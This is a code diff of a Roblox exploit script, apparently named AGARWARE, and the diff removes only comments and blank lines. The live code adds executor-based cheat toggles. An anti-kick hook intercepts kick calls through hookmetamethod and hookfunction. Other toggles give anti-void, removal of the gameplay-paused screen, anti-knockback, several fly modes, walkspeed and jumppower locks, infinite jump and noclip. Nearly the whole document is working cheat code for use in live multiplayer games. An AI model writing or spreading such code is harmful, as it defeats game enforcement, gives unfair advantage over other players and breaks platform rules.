 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Void
 				workspace.FallenPartsDestroyHeight = 0/0
-	
-				-- Keep it set to NaN even if game tries to change it
 				voidConnection = workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
 					if not _G.ConfigData["void"] then return end
-	
 					if workspace.FallenPartsDestroyHeight ~= 0/0 then
 						workspace.FallenPartsDestroyHeight = 0/0
 					end
 				end)
 			else
-				-- Disable Anti-Void
 				if voidConnection then
 					voidConnection:Disconnect()
 					voidConnection = nil
 				end
-	
-				-- Reset to default Roblox value
 				workspace.FallenPartsDestroyHeight = -500
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI GAMEPLAY PAUSED
-	-- ====================================================================================================
 	local CoreGui = game:GetService("CoreGui")
 	local networkPausedConnection = nil
-	
 	_G.CreateToggle({
 		frame = "gameplaypaused",
 		groupbox = script,
 		tooltip = "Disables 'Gameplay Paused' messages.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Gameplay Paused
 				pcall(function()
 					if networkPausedConnection then
 						networkPausedConnection:Disconnect()
 					end
 				end)
-	
 				networkPausedConnection = CoreGui.RobloxGui.ChildAdded:Connect(function(obj)
 					if obj.Name == "CoreScripts/NetworkPause" then
 						obj:Destroy()
 					end
 				end)
-	
-				-- Remove existing pause screen
 				pcall(function()
 					CoreGui.RobloxGui["CoreScripts/NetworkPause"]:Destroy()
 				end)
 			else
-				-- Disable Anti-Gameplay Paused
 				if networkPausedConnection then
 					networkPausedConnection:Disconnect()
 					networkPausedConnection = nil
@@ -8120,37 +7795,27 @@ local script = AGARWARE["114"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI KICK
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local oldhmmi = nil
 	local oldhmmnc = nil
 	local oldKickFunction = nil
-	
 	_G.CreateToggle({
 		frame = "kick",
 		groupbox = script,
 		tooltip = "Prevents only client kicks from kicking you out of the game. Enabling this might cause lag issues.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Kick
 				if not hookmetamethod then return end
-	
 				if hookfunction then
 					oldKickFunction = hookfunction(LocalPlayer.Kick, function() end)
 				end
-	
 				oldhmmi = hookmetamethod(game, "__index", function(self, method)
 					if self == LocalPlayer and method:lower() == "kick" then
 						return error("Expected ':' not '.' calling member function Kick", 2)
 					end
 					return oldhmmi(self, method)
 				end)
-	
 				oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
 					if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
 						return
@@ -8158,21 +7823,18 @@ local script = AGARWARE["114"];
 					return oldhmmnc(self, ...)
 				end)
 			else
-				-- Disable Anti-Kick
 				if oldKickFunction and hookfunction then
 					pcall(function()
 						hookfunction(LocalPlayer.Kick, oldKickFunction)
 					end)
 					oldKickFunction = nil
 				end
-	
 				if oldhmmi and hookmetamethod then
 					pcall(function()
 						hookmetamethod(game, "__index", oldhmmi)
 					end)
 					oldhmmi = nil
 				end
-	
 				if oldhmmnc and hookmetamethod then
 					pcall(function()
 						hookmetamethod(game, "__namecall", oldhmmnc)
@@ -8182,38 +7844,26 @@ local script = AGARWARE["114"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI KNOCKBACK
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	local RunService = game:GetService("RunService")
-	
 	local knockbackConnection = nil
-	
 	_G.CreateToggle({
 		frame = "knockback",
 		groupbox = script,
 		tooltip = "Prevents your character from getting knockback.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Knockback
 				knockbackConnection = RunService.Heartbeat:Connect(function()
 					if not _G.ConfigData["knockback"] then return end
-	
 					local character = LocalPlayer.Character
 					if not character then return end
-	
 					local hrp = character:FindFirstChild("HumanoidRootPart")
 					if not hrp then return end
-	
-					-- Cancel horizontal velocity, keep vertical (for jumping/falling)
 					hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
 					hrp.AssemblyAngularVelocity = Vector3.zero
 				end)
 			else
-				-- Disable Anti-Knockback
 				if knockbackConnection then
 					knockbackConnection:Disconnect()
 					knockbackConnection = nil
@@ -8227,7 +7877,6 @@ task.spawn(C_114);
 local function C_179()
 local script = AGARWARE["179"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -8254,31 +7903,19 @@ local script = AGARWARE["179"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
-	
-	
 	local Players = game:GetService("Players")
 	local RunService = game:GetService("RunService")
 	local UserInputService = game:GetService("UserInputService")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local FLYING = false
 	local iyflyspeed = 1
 	local flyKeyDown = nil
 	local flyKeyUp = nil
 	local mfly1 = nil
 	local mfly2 = nil
-	
 	local function getRoot(char)
 		return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
 	end
-	
 	local function randomString()
 		local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 		local result = ""
@@ -8288,11 +7925,8 @@ local script = AGARWARE["179"];
 		end
 		return result
 	end
-	
 	local velocityHandlerName = randomString()
 	local gyroHandlerName = randomString()
-	
-	-- PC FLY
 	local function NOFLY()
 		FLYING = false
 		if flyKeyDown then flyKeyDown:Disconnect() flyKeyDown = nil end
@@ -8302,26 +7936,20 @@ local script = AGARWARE["179"];
 		end
 		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
 	end
-	
 	local function sFLY()
 		local char = LocalPlayer.Character
 		if not char then return end
-	
 		local humanoid = char:FindFirstChildOfClass("Humanoid")
 		if not humanoid then return end
-	
 		if flyKeyDown or flyKeyUp then
 			if flyKeyDown then flyKeyDown:Disconnect() end
 			if flyKeyUp then flyKeyUp:Disconnect() end
 		end
-	
 		local T = getRoot(char)
 		if not T then return end
-	
 		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 		local SPEED = 0
-	
 		local function FLY()
 			FLYING = true
 			local BG = Instance.new('BodyGyro')
@@ -8333,20 +7961,17 @@ local script = AGARWARE["179"];
 			BG.CFrame = T.CFrame
 			BV.Velocity = Vector3.new(0, 0, 0)
 			BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-	
 			task.spawn(function()
 				repeat task.wait()
 					local camera = workspace.CurrentCamera
 					if humanoid then
 						humanoid.PlatformStand = true
 					end
-	
 					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
 						SPEED = 50
 					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
 						SPEED = 0
 					end
-	
 					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
 						BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
 						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
@@ -8357,17 +7982,14 @@ local script = AGARWARE["179"];
 					end
 					BG.CFrame = camera.CFrame
 				until not FLYING
-	
 				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 				SPEED = 0
 				BG:Destroy()
 				BV:Destroy()
-	
 				if humanoid then humanoid.PlatformStand = false end
 			end)
 		end
-	
 		flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
 			if processed then return end
 			if input.KeyCode == Enum.KeyCode.W then
@@ -8385,7 +8007,6 @@ local script = AGARWARE["179"];
 			end
 			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
 		end)
-	
 		flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
 			if processed then return end
 			if input.KeyCode == Enum.KeyCode.W then
@@ -8402,11 +8023,8 @@ local script = AGARWARE["179"];
 				CONTROL.E = 0
 			end
 		end)
-	
 		FLY()
 	end
-	
-	-- MOBILE FLY
 	local function unmobilefly()
 		pcall(function()
 			FLYING = false
@@ -8422,41 +8040,33 @@ local script = AGARWARE["179"];
 			if mfly2 then mfly2:Disconnect() end
 		end)
 	end
-	
 	local function mobilefly()
 		unmobilefly()
 		FLYING = true
-	
 		local root = getRoot(LocalPlayer.Character)
 		local camera = workspace.CurrentCamera
 		local v3none = Vector3.new()
 		local v3zero = Vector3.new(0, 0, 0)
 		local v3inf = Vector3.new(9e9, 9e9, 9e9)
-	
 		local controlModule = require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
-	
 		local bv = Instance.new("BodyVelocity")
 		bv.Name = velocityHandlerName
 		bv.Parent = root
 		bv.MaxForce = v3zero
 		bv.Velocity = v3zero
-	
 		local bg = Instance.new("BodyGyro")
 		bg.Name = gyroHandlerName
 		bg.Parent = root
 		bg.MaxTorque = v3inf
 		bg.P = 1000
 		bg.D = 50
-	
 		mfly1 = LocalPlayer.CharacterAdded:Connect(function()
 			local root = getRoot(LocalPlayer.Character)
-	
 			local bv = Instance.new("BodyVelocity")
 			bv.Name = velocityHandlerName
 			bv.Parent = root
 			bv.MaxForce = v3zero
 			bv.Velocity = v3zero
-	
 			local bg = Instance.new("BodyGyro")
 			bg.Name = gyroHandlerName
 			bg.Parent = root
@@ -8464,7 +8074,6 @@ local script = AGARWARE["179"];
 			bg.P = 1000
 			bg.D = 50
 		end)
-	
 		mfly2 = RunService.RenderStepped:Connect(function()
 			root = getRoot(LocalPlayer.Character)
 			camera = workspace.CurrentCamera
@@ -8472,13 +8081,11 @@ local script = AGARWARE["179"];
 				local humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
 				local VelocityHandler = root:FindFirstChild(velocityHandlerName)
 				local GyroHandler = root:FindFirstChild(gyroHandlerName)
-	
 				VelocityHandler.MaxForce = v3inf
 				GyroHandler.MaxTorque = v3inf
 				humanoid.PlatformStand = true
 				GyroHandler.CFrame = camera.CoordinateFrame
 				VelocityHandler.Velocity = v3none
-	
 				local direction = controlModule:GetMoveVector()
 				if direction.X > 0 then
 					VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * (iyflyspeed * 50))
@@ -8495,10 +8102,7 @@ local script = AGARWARE["179"];
 			end
 		end)
 	end
-	
-	-- Detect platform
 	local IsOnMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
-	
 	_G.CreateTextbox({
 		frame = "Fly",
 		textboxname = "FlyChanger",
@@ -8512,7 +8116,6 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
 	_G.CreateToggle({
 		frame = "Fly",
 		groupbox = script,
@@ -8533,23 +8136,11 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- WALKSPEED CONFIGS
-	-- ====================================================================================================
 	local LocalPlayer = game:GetService("Players").LocalPlayer
 	local RunService = game:GetService("RunService")
-	
 	local walkspeedValue = 16
 	local walkspeedEnabled = false
 	local walkspeedLoop = nil
-	
 	_G.CreateTextbox({
 		frame = "Walkspeed",
 		textboxname = "WalkspeedChanger",
@@ -8560,8 +8151,6 @@ local script = AGARWARE["179"];
 			local value = tonumber(text)
 			if value then
 				walkspeedValue = value
-	
-				-- Only apply if walkspeed is enabled
 				if walkspeedEnabled then
 					local character = LocalPlayer.Character
 					if character then
@@ -8580,9 +8169,7 @@ local script = AGARWARE["179"];
 		tooltip = "Locks your walkspeed to what speed is set. Use the textbox to adjust speed.",
 		callback = function(isEnabled)
 			walkspeedEnabled = isEnabled
-	
 			if isEnabled then
-				-- Start walkspeed lock loop
 				walkspeedLoop = RunService.Heartbeat:Connect(function()
 					local character = LocalPlayer.Character
 					if character then
@@ -8593,12 +8180,10 @@ local script = AGARWARE["179"];
 					end
 				end)
 			else
-				-- Stop loop and reset to default
 				if walkspeedLoop then
 					walkspeedLoop:Disconnect()
 					walkspeedLoop = nil
 				end
-	
 				local character = LocalPlayer.Character
 				if character then
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -8609,24 +8194,11 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- JUMPPOWER
-	-- ====================================================================================================
 	local LocalPlayer = game:GetService("Players").LocalPlayer
 	local RunService = game:GetService("RunService")
-	
 	local jumppowerValue = 50
 	local jumppowerEnabled = false
 	local jumppowerLoop = nil
-	
 	_G.CreateTextbox({
 		frame = "Jumppower",
 		textboxname = "JumppowerChanger",
@@ -8637,8 +8209,6 @@ local script = AGARWARE["179"];
 			local value = tonumber(text)
 			if value then
 				jumppowerValue = value
-	
-				-- Only apply if jumppower is enabled
 				if jumppowerEnabled then
 					local character = LocalPlayer.Character
 					if character then
@@ -8652,16 +8222,13 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
 	_G.CreateToggle({
 		frame = "Jumppower",
 		groupbox = script,
 		tooltip = "Locks your jumppower to what number is set. Use the textbox to adjust power.",
 		callback = function(isEnabled)
 			jumppowerEnabled = isEnabled
-	
 			if isEnabled then
-				-- Start jumppower lock loop
 				jumppowerLoop = RunService.Heartbeat:Connect(function()
 					local character = LocalPlayer.Character
 					if character then
@@ -8673,12 +8240,10 @@ local script = AGARWARE["179"];
 					end
 				end)
 			else
-				-- Stop loop and reset to default
 				if jumppowerLoop then
 					jumppowerLoop:Disconnect()
 					jumppowerLoop = nil
 				end
-	
 				local character = LocalPlayer.Character
 				if character then
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -8690,18 +8255,6 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- INF JUMP
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "InfJump",
 		groupbox = script,
@@ -8710,7 +8263,6 @@ local script = AGARWARE["179"];
 			if isEnabled then
 				local UserInputService = game:GetService("UserInputService")
 				local LocalPlayer = game:GetService("Players").LocalPlayer
-	
 				_G.InfJumpConn = UserInputService.JumpRequest:Connect(function()
 					local character = LocalPlayer.Character
 					if not character then return end
@@ -8727,12 +8279,6 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	
-	
-	-- ====================================================================================================
-	-- TP SPAWN
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "TPSpawn",
 		groupbox = script,
@@ -8750,25 +8296,14 @@ local script = AGARWARE["179"];
 			end
 		end,
 	})
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- NOCLIP
-	-- ====================================================================================================
 	local RunService = game:GetService("RunService")
 	local noclipConnection
-	
 	_G.CreateToggle({
 		frame = "Noclip",
 		groupbox = script,
 		tooltip = "Allows you to walk through walls and objects. Collision is restored automatically when disabled.",
 		callback = function(isEnabled)
 			local nocollideParts = {"Head", "Left Arm", "Right Arm", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm"}
-	
 			local function setCollisionDefaults()
 				local character = LocalPlayer.Character
 				if not character then return end
@@ -8785,7 +8320,6 @@ local script = AGARWARE["179"];
 					end
 				end
 			end
-	
 			if isEnabled then
 				noclipConnection = RunService.Heartbeat:Connect(function()
 					local character = LocalPlayer.Character
@@ -8812,22 +8346,14 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	
-	
-	-- ====================================================================================================
-	-- VFLY
-	-- ====================================================================================================
 	local vehicleflyspeed = 1
 	local vFLYING = false
 	local vflyKeyDown = nil
 	local vflyKeyUp = nil
-	
 	local vvelocityHandlerName = randomString()
 	local vgyroHandlerName = randomString()
 	local vmfly1 = nil
 	local vmfly2 = nil
-	
 	local unvmobilefly = function()
 		pcall(function()
 			vFLYING = false
@@ -8838,32 +8364,26 @@ local script = AGARWARE["179"];
 			if vmfly2 then vmfly2:Disconnect() end
 		end)
 	end
-	
 	local vmobilefly = function()
 		unvmobilefly()
 		vFLYING = true
-	
 		local root = getRoot(LocalPlayer.Character)
 		local camera = workspace.CurrentCamera
 		local v3none = Vector3.new()
 		local v3zero = Vector3.new(0, 0, 0)
 		local v3inf = Vector3.new(9e9, 9e9, 9e9)
-	
 		local controlModule = require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
-	
 		local bv = Instance.new("BodyVelocity")
 		bv.Name = vvelocityHandlerName
 		bv.Parent = root
 		bv.MaxForce = v3zero
 		bv.Velocity = v3zero
-	
 		local bg = Instance.new("BodyGyro")
 		bg.Name = vgyroHandlerName
 		bg.Parent = root
 		bg.MaxTorque = v3inf
 		bg.P = 1000
 		bg.D = 50
-	
 		vmfly1 = LocalPlayer.CharacterAdded:Connect(function()
 			local root = getRoot(LocalPlayer.Character)
 			local bv = Instance.new("BodyVelocity")
@@ -8878,7 +8398,6 @@ local script = AGARWARE["179"];
 			bg.P = 1000
 			bg.D = 50
 		end)
-	
 		vmfly2 = RunService.RenderStepped:Connect(function()
 			local root = getRoot(LocalPlayer.Character)
 			camera = workspace.CurrentCamera
@@ -8899,21 +8418,17 @@ local script = AGARWARE["179"];
 			end
 		end)
 	end
-	
 	local function VFLY()
 		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 		local humanoid = char:FindFirstChildOfClass("Humanoid")
 		if not humanoid then return end
 		local T = getRoot(char)
 		if not T then return end
-	
 		if vflyKeyDown then vflyKeyDown:Disconnect() end
 		if vflyKeyUp then vflyKeyUp:Disconnect() end
-	
 		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 		local SPEED = 0
-	
 		vFLYING = true
 		local BG = Instance.new("BodyGyro")
 		local BV = Instance.new("BodyVelocity")
@@ -8924,7 +8439,6 @@ local script = AGARWARE["179"];
 		BV.Velocity = Vector3.new(0, 0, 0)
 		BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
 		BV.Parent = T
-	
 		task.spawn(function()
 			repeat task.wait()
 				local camera = workspace.CurrentCamera
@@ -8949,7 +8463,6 @@ local script = AGARWARE["179"];
 			BG:Destroy()
 			BV:Destroy()
 		end)
-	
 		vflyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
 			if processed then return end
 			if input.KeyCode == Enum.KeyCode.W then CONTROL.F = vehicleflyspeed
@@ -8960,7 +8473,6 @@ local script = AGARWARE["179"];
 			elseif input.KeyCode == Enum.KeyCode.Q then CONTROL.E = -vehicleflyspeed * 2
 			end
 		end)
-	
 		vflyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
 			if processed then return end
 			if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 0
@@ -8972,7 +8484,6 @@ local script = AGARWARE["179"];
 			end
 		end)
 	end
-	
 	local function NOVFLY()
 		vFLYING = false
 		if vflyKeyDown then vflyKeyDown:Disconnect() vflyKeyDown = nil end
@@ -8983,7 +8494,6 @@ local script = AGARWARE["179"];
 			pcall(function() root:FindFirstChild(vgyroHandlerName):Destroy() end)
 		end
 	end
-	
 	_G.CreateToggle({
 		frame = "VFly",
 		groupbox = script,
@@ -9017,13 +8527,8 @@ local script = AGARWARE["179"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- CFLY
-	-- ====================================================================================================
 	CFspeed = 50
 	local CFloop
-	
 	_G.CreateToggle({
 		frame = "CFly",
 		groupbox = script,
@@ -9073,7 +8578,6 @@ task.spawn(C_179);
 local function C_201()
 local script = AGARWARE["201"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -9100,22 +8604,11 @@ local script = AGARWARE["201"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	-- ====================================================================================================
-	-- FORCE R6
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	local AnimCache = {}
 	local r6Connection = nil
 	local isR6Enabled = false
-	
-	-- Correct R6 Animation IDs
 	local Animations = {
 		Run = {
 			RunAnim = 12518152696
@@ -9140,13 +8633,11 @@ local script = AGARWARE["201"];
 			SitAnim = 12520993168
 		}
 	}
-	
 	local function StopAnimations(Humanoid)
 		for _, Animation in Humanoid:GetPlayingAnimationTracks() do
 			Animation:Stop()
 		end
 	end
-	
 	local function LoadAnimations(Animate)
 		AnimCache = {}
 		for Animation, Child in Animations do
@@ -9160,7 +8651,6 @@ local script = AGARWARE["201"];
 			end
 		end
 	end
-	
 	local function RestoreAnimations()
 		for _, Data in AnimCache do
 			local Child, Id = Data[1], Data[2]
@@ -9170,46 +8660,36 @@ local script = AGARWARE["201"];
 		end
 		AnimCache = {}
 	end
-	
 	local function Animate(Character)
-		if not isR6Enabled then return end -- Don't run if disabled
-	
+		if not isR6Enabled then return end 
 		local Humanoid = Character:WaitForChild("Humanoid")
 		local Animate = Character:WaitForChild("Animate")
 		task.wait(0.5)
-	
-		if not isR6Enabled then return end -- Check again after wait
-	
+		if not isR6Enabled then return end 
 		StopAnimations(Humanoid)
 		LoadAnimations(Animate)
 		StopAnimations(Humanoid)
 	end
-	
 	_G.CreateToggle({
 		frame = "R6",
 		groupbox = script,
 		tooltip = "Forces your character's rig type to R6.",
 		callback = function(isEnabled)
 			isR6Enabled = isEnabled
-	
 			if isEnabled then
-				-- Enable Force R6
 				local function HandleCharacter(Char)
 					if not Char or not isR6Enabled then return end
 					local Hum = Char:WaitForChild("Humanoid")
 					if not Hum or Hum.RigType ~= Enum.HumanoidRigType.R15 then return end
 					Animate(Char)
 				end
-	
 				HandleCharacter(LocalPlayer.Character)
 				r6Connection = LocalPlayer.CharacterAdded:Connect(HandleCharacter)
 			else
-				-- Disable Force R6
 				if r6Connection then
 					r6Connection:Disconnect()
 					r6Connection = nil
 				end
-	
 				local Char = LocalPlayer.Character
 				if Char then
 					local Hum = Char:FindFirstChildOfClass("Humanoid")
@@ -9222,15 +8702,6 @@ local script = AGARWARE["201"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- RESET CHARACTER
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "Reset",
 		groupbox = script,
@@ -9250,14 +8721,6 @@ local script = AGARWARE["201"];
 			return false
 		end,
 	})
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- FREEZE ANIMATIONS
-	-- ====================================================================================================
 	_G.CreateButtonToggle({
 		frame = "FreezeAnim",
 		groupbox = script,
@@ -9269,7 +8732,6 @@ local script = AGARWARE["201"];
 			local humanoid = character:FindFirstChildOfClass("Humanoid")
 			if not humanoid then return end
 			local animate = character:FindFirstChild("Animate")
-	
 			if isEnabled then
 				if animate then
 					animate.Disabled = true
@@ -9292,7 +8754,6 @@ task.spawn(C_201);
 local function C_22c()
 local script = AGARWARE["22c"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -9319,35 +8780,23 @@ local script = AGARWARE["22c"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local UserInputService = game:GetService("UserInputService")
 	local RunService = game:GetService("RunService")
 	local ContextActionService = game:GetService("ContextActionService")
-	
 	local LocalPlayer = Players.LocalPlayer
-	
 	local active = nil
 	local lastPressTime = 0
 	local debounceTime = 0.2
-	
 	local shiftLockGui = nil
 	local imageButton = nil
-	
 	local states = {
 		OFF = "rbxasset://textures/ui/mouseLock_off@2x.png",
 		ON = "rbxasset://textures/ui/mouseLock_on@2x.png"
 	}
-	
 	local MAX_LENGTH = 900000
 	local ENABLED_OFFSET = CFrame.new(1.7, 0, 0)
 	local DISABLED_OFFSET = CFrame.new(-1.7, 0, 0)
-	
 	local function getCharacterParts()
 		local character = LocalPlayer.Character
 		if not character then return nil, nil, nil end
@@ -9356,13 +8805,11 @@ local script = AGARWARE["22c"];
 		local camera = workspace.CurrentCamera
 		return humanoid, hrp, camera
 	end
-	
 	local function updateImage(state)
 		if imageButton then
 			imageButton.Image = states[state]
 		end
 	end
-	
 	local function disableShiftlock()
 		local humanoid, hrp, camera = getCharacterParts()
 		if humanoid then humanoid.AutoRotate = true end
@@ -9373,7 +8820,6 @@ local script = AGARWARE["22c"];
 			active = nil
 		end
 	end
-	
 	local function enableShiftlock()
 		local humanoid, hrp, camera = getCharacterParts()
 		if not humanoid or not hrp or not camera then return end
@@ -9386,12 +8832,10 @@ local script = AGARWARE["22c"];
 		camera.CFrame = camera.CFrame * ENABLED_OFFSET
 		updateImage("ON")
 	end
-	
 	local function shiftLockToggle()
 		local currentTime = tick()
 		if currentTime - lastPressTime < debounceTime then return end
 		lastPressTime = currentTime
-	
 		if not active then
 			active = RunService.RenderStepped:Connect(function()
 				enableShiftlock()
@@ -9400,23 +8844,19 @@ local script = AGARWARE["22c"];
 			disableShiftlock()
 		end
 	end
-	
 	local function createUI()
 		if shiftLockGui then
 			shiftLockGui:Destroy()
 			shiftLockGui = nil
 			imageButton = nil
 		end
-	
 		local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-	
 		shiftLockGui = Instance.new("ScreenGui")
 		shiftLockGui.Name = "ShiftLockGui"
 		shiftLockGui.ResetOnSpawn = false
 		shiftLockGui.DisplayOrder = 999
 		shiftLockGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 		shiftLockGui.Parent = playerGui
-	
 		imageButton = Instance.new("ImageButton")
 		imageButton.BackgroundTransparency = 1
 		imageButton.Position = UDim2.new(0.921914339, 0, 0.552375436, 0)
@@ -9426,12 +8866,9 @@ local script = AGARWARE["22c"];
 		imageButton.Modal = true
 		imageButton.Active = true
 		imageButton.Parent = shiftLockGui
-	
-		-- Draggable logic
 		local dragging = false
 		local dragStart = Vector2.new()
 		local startPos = UDim2.new()
-	
 		imageButton.InputBegan:Connect(function(input)
 			if input.UserInputType == Enum.UserInputType.Touch then
 				dragging = true
@@ -9439,13 +8876,11 @@ local script = AGARWARE["22c"];
 				startPos = imageButton.Position
 			end
 		end)
-	
 		imageButton.InputEnded:Connect(function(input)
 			if input.UserInputType == Enum.UserInputType.Touch then
 				dragging = false
 			end
 		end)
-	
 		RunService.RenderStepped:Connect(function()
 			if dragging then
 				local touchPos = UserInputService:GetTouchPosition(1)
@@ -9459,19 +8894,15 @@ local script = AGARWARE["22c"];
 				end
 			end
 		end)
-	
 		imageButton.MouseButton1Click:Connect(function()
 			shiftLockToggle()
 		end)
-	
-		-- PC: bind shift key
 		ContextActionService:BindAction("ShiftLockToggle", function(_, inputState)
 			if inputState == Enum.UserInputState.Begin then
 				shiftLockToggle()
 			end
 		end, false, Enum.KeyCode.LeftShift)
 	end
-	
 	local function destroyUI()
 		disableShiftlock()
 		ContextActionService:UnbindAction("ShiftLockToggle")
@@ -9481,7 +8912,6 @@ local script = AGARWARE["22c"];
 			imageButton = nil
 		end
 	end
-	
 	_G.CreateToggle({
 		frame = "mobShiftlock",
 		groupbox = script,
@@ -9494,32 +8924,16 @@ local script = AGARWARE["22c"];
 			end
 		end
 	})
-	
 	LocalPlayer.CharacterAdded:Connect(function()
 		if _G.ConfigData and _G.ConfigData["mobShiftlock"] then
 			task.wait(0.5)
 			createUI()
 		end
 	end)
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- CAP FPS
-	-- ====================================================================================================
 	local RunService = game:GetService("RunService")
-	
 	local fpsCapValue = 60
 	local fpsCapEnabled = false
 	local fpsCapLoop = nil
-	
 	_G.CreateTextbox({
 		frame = "CapFPS",
 		textboxname = "CapFPSChanger",
@@ -9530,8 +8944,6 @@ local script = AGARWARE["22c"];
 			local value = tonumber(text)
 			if value then
 				fpsCapValue = value
-	
-				-- Only apply if FPS cap is enabled
 				if fpsCapEnabled then
 					pcall(function()
 						setfpscap(fpsCapValue)
@@ -9540,56 +8952,35 @@ local script = AGARWARE["22c"];
 			end
 		end
 	})
-	
 	_G.CreateToggle({
 		frame = "CapFPS",
 		groupbox = script,
 		tooltip = "Caps your FPS to whatever number is set.",
 		callback = function(isEnabled)
 			fpsCapEnabled = isEnabled
-	
 			if isEnabled then
-				-- Set FPS cap
 				pcall(function()
 					setfpscap(fpsCapValue)
